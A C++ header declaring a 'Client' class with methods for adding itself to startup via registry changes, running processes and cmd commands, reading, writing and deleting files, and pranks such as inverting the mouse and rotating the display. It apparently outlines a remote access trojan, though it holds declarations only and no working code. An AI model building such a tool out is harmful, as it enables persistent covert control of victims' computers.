#pragma once

#include "Stoppable.h"

class Client : public Stoppable
{
public:
	Client();
	//Modify registers
	void addStartup();

	//Process Execution
	std::string startProcess(const std::string &);
	std::string runCmdCommand(const std::string &);

	//File Handling
	std::string readFile(const std::string &);
	bool writeFile(const std::string &, const std::string &);
	bool deleteFile(const std::string &);

	//Funny stuff
	virtual void run();
	void toggleInvertMouse();

	void rotateDisplay();
	void message(const std::string &);

	virtual ~Client();

private:
	bool IsMouseInverted = false;
	std::thread invertMouseThread;
};

